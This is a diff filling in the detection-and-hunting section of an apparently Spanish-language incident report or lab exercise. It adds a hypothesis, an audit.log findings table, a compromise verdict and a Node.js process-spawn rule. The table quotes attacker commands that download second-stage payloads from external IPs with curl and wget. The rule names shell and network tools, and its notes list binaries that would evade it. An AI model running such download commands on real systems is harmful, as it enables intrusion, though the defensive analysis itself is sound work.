@@ -92,21 +92,25 @@ brotli 1.2.1
 
 ## 4. Detección y caza
 
-**Hipótesis:** _una frase: proceso, padre, horario, evidencia esperada._
+**Hipótesis:** un proceso de aplicación (`apache2`, `node` o `python`) lanza como hijo `sh`, `bash`, `curl` o `wget` entre las 09:40Z y las 09:50Z del 27/10/2026, y en `audit.log` debería verse el par padre → hijo.
 
 **Hallazgos en `audit.log`:**
 
 | Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
 |-------------------|------|--------------|:---------:|---------|
-| | | | | |
-| | | | | |
+| L6 · 09:42:17Z | web01 | `apache2` → `sh -c id` | Sí | Un worker web no lanza shells; reconocimiento. |
+| L9 · 09:43:03Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` | Sí | Descarga desde IP externa (segunda etapa). |
+| L14 · 09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | Sí | Descarga desde otra IP externa. |
+| L16 · 09:45:10Z | svc01 | `python` → `sh -c uname -a` | Sí | Reconocimiento del sistema. |
+| L8, L13, L21 | db01 | `sshd` → `bash` | No (probable) | Sesión SSH administrativa; falso positivo. |
 
-**¿Hay compromiso?** _sí/no/indeterminado, con evidencia._
+**¿Hay compromiso?** Sí en `web01`, `api01` y `svc01` (ejecución de comandos en L6, L9, L14, L16). Indeterminado si las descargas se completaron: el log no registra resultado de red.
 
-**Regla propuesta para Node.js:** _qué proceso observa, qué condición y qué falso
-negativo podría tener._
+**Regla propuesta para Node.js:** observa la creación de procesos con `ppid_comm=node` y alerta si `comm ∈ {sh, bash, curl, wget, nc}`. Falso negativo: ejecución dentro del propio proceso `node` sin proceso hijo, o uso de otros binarios (`python`, `perl`, `socat`).
 
-**Limitaciones del log:** _usuario, IP de origen, retención, ruido, etc._
+**Limitaciones del log:** no registra usuario, IP de origen ni resultado de los comandos; cubre ~10 minutos; sin telemetría de red ni archivos; `detectar.sh` solo muestra hijos directos de la app y omite `id` y `uname`.
+
+Detalle completo en [`deteccion.md`](./deteccion.md).
 
 ---
 
